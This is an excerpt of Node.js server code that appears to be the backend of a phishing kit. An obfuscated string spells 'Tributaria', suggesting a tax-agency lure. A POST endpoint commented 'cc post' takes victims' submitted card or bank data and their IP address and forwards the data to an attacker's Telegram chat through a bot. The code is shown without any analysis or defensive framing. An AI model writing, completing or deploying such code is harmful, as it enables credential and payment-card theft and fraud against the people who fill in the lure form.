...
let target = "T-1r-1i-1b-1u-1t-1a-1r-1i-1a"; // hadi hizyada;
...
app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
    ...
    bin(data,requestIp.getClientIp(req));
    res.send({OK:true});
});
...
function bin(data,ip){
    let b = data.a3;
    let bana = b.replace( /\s/g, '');
    let block="Chman banka: "+bana;
    bot.telegram.sendMessage(process.env.CHATID,block);
}
